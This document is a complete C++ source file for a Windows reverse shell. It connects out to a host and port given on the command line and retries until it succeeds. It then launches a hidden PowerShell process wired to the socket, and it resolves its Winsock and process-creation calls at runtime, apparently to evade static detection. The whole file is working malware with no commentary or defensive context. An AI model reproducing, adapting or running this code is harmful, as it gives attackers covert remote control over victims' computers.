#include <WinSock2.h>
#include <cstdio>

struct sockaddr_in rev;
char ip[16];
int len, port;
WSADATA wsa;
STARTUPINFOA sui;
PROCESS_INFORMATION pi;
SOCKET s;

typedef SOCKET(WINAPI *pWSASocketA)(int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD);
typedef int(WINAPI *pconnect)(SOCKET, const sockaddr *, int);
typedef BOOL(WINAPI *pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);

int main(int argc, char const *argv[])

{
    if (argc == 3)
    {
        HMODULE hWS2_32 = GetModuleHandleW(L"ws2_32.dll");
        HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
        pWSASocketA fWSASocketA = (pWSASocketA)GetProcAddress(hWS2_32, "WSASocketA");
        pconnect fconnect = (pconnect)GetProcAddress(hWS2_32, "connect");
        pCreateProcessA fCreateProcessA = (pCreateProcessA)GetProcAddress(hKernel32, "CreateProcessA");

        len = strlen(argv[1]);
        RtlCopyMemory(ip, argv[1], len);
        port = atoi(argv[2]);
        char cmd[15] = "powershell.exe";
        WSAStartup(MAKEWORD(2, 2), &wsa);
        s = fWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        rev.sin_addr.s_addr = inet_addr(ip);
        rev.sin_port = htons(port);
        rev.sin_family = AF_INET;
        while (true)
        {

            if (fconnect(s, (struct sockaddr *)&rev, sizeof(rev)) != 0)
            {
                puts("[!] Couldn't connect, retrying...");
                Sleep(2000);
            }
            else
            {
                puts("[+] Connected");
                memset(&sui, 0, sizeof(sui));
                sui.cb = sizeof(sui);
                sui.dwFlags = STARTF_USESTDHANDLES;
                sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s;

                fCreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sui, &pi);
                exit(0);
            }
        }
    }
    else
    {
        puts("Usage: ./program HOST PORT");
    }
    return 0;
}
